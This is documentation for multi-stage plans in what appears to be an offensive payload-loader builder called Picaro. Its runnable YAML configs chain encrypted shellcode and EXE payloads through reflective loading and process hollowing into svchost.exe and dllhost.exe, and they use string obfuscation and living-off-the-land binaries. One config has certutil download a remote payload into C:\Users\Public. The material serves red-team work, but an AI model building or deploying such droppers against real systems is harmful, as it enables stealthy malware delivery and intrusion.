# Multi-stage plans

Schema 5 adds an ordered **`stages:`** chain, so one artifact can deliver
**several payloads** — two shellcodes, two EXEs, or a mix — plus
living-off-the-land commands, instead of a single payload. A stage is an
*action*:

- **`technique`** — run an embedded payload with a preparation + execution
  pipeline (the single-payload shape, generalized). Each stage carries its own
  payload and its own pipeline.
- **`exec`** — launch a process: a signed Microsoft binary (T1218 proxy
  execution) or any command.
- **`sleep`** — wait.

A schema-4 document is still accepted: it is the single-payload shorthand and is
normalized internally to one `technique` stage, so nothing changes for existing
plans. Only a plan that declares `stages:` uses the multi-stage build path.

Two runnable examples: [`examples/plans/multistage.yaml`](https://github.com/M3str3/Picaro/blob/main/examples/plans/multistage.yaml)
(two shellcodes + a living-off-the-land command) and the richer
[`examples/plans/multistage-advanced.yaml`](https://github.com/M3str3/Picaro/blob/main/examples/plans/multistage-advanced.yaml)
(a `bouncer` gate with indirect syscalls, a `certutil` download stage, a hollowed
EXE, a sleep, a detached `rundll32` proxy and a terminal reflective stage).

## The rule that shapes everything: which stages return control

A chain only continues if the loader gets control back after a stage. That is a
property of the action and the payload, not a flag:

| Stage | Returns control? | Why |
| --- | --- | --- |
| `exec` | **Always** | The loader spawns a child and keeps running. |
| `process_hollowing` | **Always** | A separate process; the loader waits and reads its exit status. |
| `reflective_loading` + `dll` | **Always** | A mapped DLL's entry point is `DllMain`, which returns. |
| `reflective_loading` + `shellcode` | **If the shellcode returns** | It runs on its own thread; a beacon that never returns blocks the chain. |
| `reflective_loading` + `pe` (an EXE) | **No** | The entry point runs on the stub's thread and a normal `mainCRTStartup` calls `ExitProcess`, killing the whole process. |
| `dotnet_hosting` | **No** | The CLR is hosted in the stub's process; a managed `Main` that exits ends it. |

So a **terminal** stage (`reflective_loading` of a PE executable, or
`dotnet_hosting`) can only be the **last** one; `plan::validate` rejects it
otherwise. Everything else chains.

## Syntax

```yaml
schema: 5
name: two-shellcode

build:
  output:
    path: ./dist/two_shellcode.exe
    arch: x64
    strip: true
    trim_paths: all
  stub:
    strings: { strategy: xor, key: random }

stages:
  - name: dropper
    action: technique
    payload:
      source: ./stage1.bin
      format: shellcode
      crypto: { algo: xchacha20poly1305, key: random }
    runtime:
      - technique: reflective_loading
    on_success: continue

  - name: implant
    action: technique
    payload:
      source: ./stage2.bin
      format: shellcode
      crypto: { algo: xchacha20poly1305, key: random }
    runtime:
      - technique: reflective_loading
```

Two EXEs in one artifact — each runs in its own process, because a reflectively
loaded EXE is terminal:

```yaml
stages:
  - action: technique
    payload: { source: ./a.exe, format: pe, crypto: { algo: xchacha20poly1305, key: random } }
    runtime:
      - technique: process_hollowing
        params: { target: "C:\\Windows\\System32\\svchost.exe" }
  - action: technique
    payload: { source: ./b.exe, format: pe, crypto: { algo: xchacha20poly1305, key: random } }
    runtime:
      - technique: process_hollowing
        params: { target: "C:\\Windows\\System32\\dllhost.exe" }
```

Living off the land with an `exec` stage:

```yaml
stages:
  - name: fetch
    action: exec
    binary: certutil.exe            # a bare name is resolved in System32
    args: ["-urlcache", "-split", "-f", "https://host/p.bin", "C:\\Users\\Public\\p.bin"]
    wait: true
    timeout_s: 60
    window: hidden
    on_fail: stop
```

## Stage fields

Common:

| Field | Default | Meaning |
| --- | --- | --- |
| `name` | `<action><index>` | Label used in the build log and the generated module names. |
| `action` | `technique` | `technique`, `exec` or `sleep`. |
| `on_success` | `continue` | `continue` \| `stop` (stop with this stage's code) \| `exit` (stop, exit 0). |
| `on_fail` | `stop` | `stop` (report and exit 1) \| `continue` (log and go on) \| `exit` (report, exit 0). |
| `delay_ms` | `0` | Wait before starting the stage. |

`technique`:

| Field | Meaning |
| --- | --- |
| `payload` | The payload block (inline; each stage carries its own). |
| `runtime` | The preparation + execution techniques, exactly as in a single-payload plan. |

`exec`:

| Field | Default | Meaning |
| --- | --- | --- |
| `binary` | — | Process to launch. A bare name is resolved against `System32` at run time; a path is used as is. |
| `args` | `[]` | Arguments (rebuilt at run time through `StringsConfig`). |
| `wait` | `true` | Wait and capture the exit code (enables gating), or detach. |
| `window` | `hidden` | `hidden` (`CREATE_NO_WINDOW`) or `normal`. |
| `timeout_s` | `0` | Seconds before the child is terminated (0 = no limit). |

`sleep`:

| Field | Meaning |
| --- | --- |
| `sleep_ms` | Milliseconds to wait. |

Each `technique` stage's `build.payload.args` and `build.payload.args_mode` are
applied to that stage only: the generated runner sets a thread-local context
before the stage, so two stages can pass different arguments to their payloads.

An `exec` `binary` outside a curated living-off-the-land catalogue (`certutil`,
`bitsadmin`, `rundll32`, `regsvr32`, `mshta`, `wmic`, `msbuild`, `curl`, `cmd`,
`powershell`, ...) draws a **build warning**. It is advisory only: the stage
still runs the binary.

## How it is built

The multi-stage path renders a dedicated template
(`templates/stub/main_stages.rs.tpl`):

- every payload is encrypted with its own key/nonce and embedded with
  `include_bytes!`;
- each `technique` stage's pipeline is wrapped in its own `mod stage_<index>`
  (so two stages can use the same technique without colliding on top-level
  names), exposing `preps()` and `payload()`;
- each `exec` stage becomes a `mod stage_<index>` with `run_exec()`;
- a generated runner walks the stages in order, decrypting each payload,
  printing its per-stage marker, and applying the declared gating.

The single-payload path is **unchanged**: it still renders
`templates/stub/main.rs.tpl`, so its output (and every existing test) is
identical.

## Validation

- each `technique` stage has exactly one Execution technique (the usual pipeline
  rule); `exec`/`sleep` stages declare no `runtime` and no `payload`;
- the **terminal-stage** rule above;
- `build.stub.api_resolution.mode: proxy` is loader-wide, so it is rejected on a
  multi-stage plan;
- format/technique and architecture rules apply per stage, against the shared
  `build.output.arch`.

## Limitations

- **A terminal stage must be last.** `reflective_loading` of a PE executable and
  `dotnet_hosting` hand the process over.
- **In-process chaining leaves the process dirty** (an unfreed mapped image, a
  leaked `TlsAlloc` index, a repatched PEB command line). Prefer process-based
  stages (`exec`, `process_hollowing`) when chaining more than one technique
  stage.
- **A shellcode stage only chains if the shellcode returns.** Running two
  non-returning shellcodes needs a process-per-stage injection technique (not
  implemented yet).
- **Two reflectively loaded EXEs cannot be chained** without intercepting
  `ExitProcess`/`TerminateProcess` (future work).
- **`exec` spawns a visible child** (PPID = the stub, command line observable);
  `window: hidden` hides the window only. `ppid_spoofing` is the follow-up.
- The provenance manifest records the **first** payload's hash and nonce; a
  stages-aware manifest is a follow-up.

## Roadmap

- Returning techniques (cooperative payloads, an `ExitProcess` interceptor) so
  more stages can chain in-process.
- A run-time network stager (`payload.source: http(s)://` resolved in the stub).
- A stages-aware manifest (one record per stage).
- A wizard flow for building `stages:` interactively.
